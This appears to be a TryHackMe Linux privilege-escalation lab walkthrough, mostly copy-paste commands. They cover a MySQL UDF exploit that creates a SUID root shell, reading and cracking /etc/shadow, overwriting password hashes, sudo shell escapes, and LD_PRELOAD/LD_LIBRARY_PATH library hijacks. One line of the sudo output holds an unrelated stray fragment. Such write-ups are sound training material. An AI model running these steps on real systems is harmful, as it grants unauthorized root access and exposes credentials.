# TRYHACKME : Linux PrivEsc
Deploy the target machine, and enter the following ssh credentials: `user:password321`

## Service Exploits
Simply copy in consecutive order the ff commands:
```
cd /home/user/tools/mysql-udf
```
Compiler the following file `raptor_udf2.c`
```
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
Connect to the mysql with no password:
```
mysql -u root
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:
```
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
whoami  // voila root access
```


## Weak File Permissions - Readable /etc/shadow
```
ls -l /etc/shadow
cat /etc/shadow
```
Save the root password hash to a txt file. The hash is found between the first and second colon.

Then run John the Ripper or use online resources to crack it.
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
The type of hashing algorithm used will appear during John the Ripper cracking.

## Weak File Permissions - Writable /etc/shadow
If the file is writable, we can change the root password by generating a new hash password (same hashing algorithm as the previous password), and replacing the existing hash.
```
mkpasswd -m sha-512 newpasswordhere
```
Then edit the /etc/shadow and replace the old hash password.

Switch to root user.
```
su
```

## Weak File Permission - Writable /etc/passwd
Some old versions of linux stores user password hashes. 

If the `/etc/passwd` happens to be writable, we can generate a hash and store it within the first and second colon.

Generate new hash password:
```
openssl passwd newpasswordhere
```

Then edit the root in `/etc/passwd`. Place the hash between the first and second hash.

After that you can switch to the root user.


```
su
```

## Sudo - Shell Escape Sequences

List all programs user has sudo permissions.

user@debian:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

```
User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2e metadata related to the photo by looking at the post’s metadata.
    (root) NOPASSWD: /bin/more
```

You can look up in [GTFOBins](https://gtfobins.github.io/) each directory and their exploit command to access root, except `/apache2`.

## Sudo - Environmental Variables
### sudo -l
From using the `sudo -l` command, the environment variables shared with the users can also be exploited.

```
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
```

We have a tool called `preload.c` we can use to exploit the `env_keep+=LD_PRELOAD`.

Compile the following tool with the command:
```
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```

Then run in sudo any program you can run (I used `vim`), while setting the LD_PRELOAD with the full path of new shared object: 
```
sudo LD_PRELOAD=/tmp/preload.so program-name-here
```
Then you'll get root access.

### Program's Shared Library

You can also exploit shared libraries used by a program.

Let's use the `apache2` program for example:
```
user@debian:~$ ldd /usr/sbin/apache2
        linux-vdso.so.1 =>  (0x00007fff629ff000)
        libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f5534a7d000)
        libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007f5534859000)
        libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007f553461f000)
        libpthread.so.0 => /lib/libpthread.so.0 (0x00007f5534403000)
        libc.so.6 => /lib/libc.so.6 (0x00007f5534097000)
        libuuid.so.1 => /lib/libuuid.so.1 (0x00007f5533e92000)
        librt.so.1 => /lib/librt.so.1 (0x00007f5533c8a000)
        libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f5533a53000)
        libdl.so.2 => /lib/libdl.so.2 (0x00007f553384e000)
        libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f5533626000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f5534f3a000)
```

We have a tool called library_path.c from the `tools` directory, we compile it first in the `/tmp` directory:
```
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```

Then run sudo command with apache2 program while setting up the library shared with `/tmp` directory storing the compiled tool before:
```
sudo LD_LIBRARY_PATH=/tmp apache2

```
Then you'll get root access.

## Cron Jobs - File Permission

First, let's view the following programs or scripts cronjob is scheduled to run.

```
user@debian:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

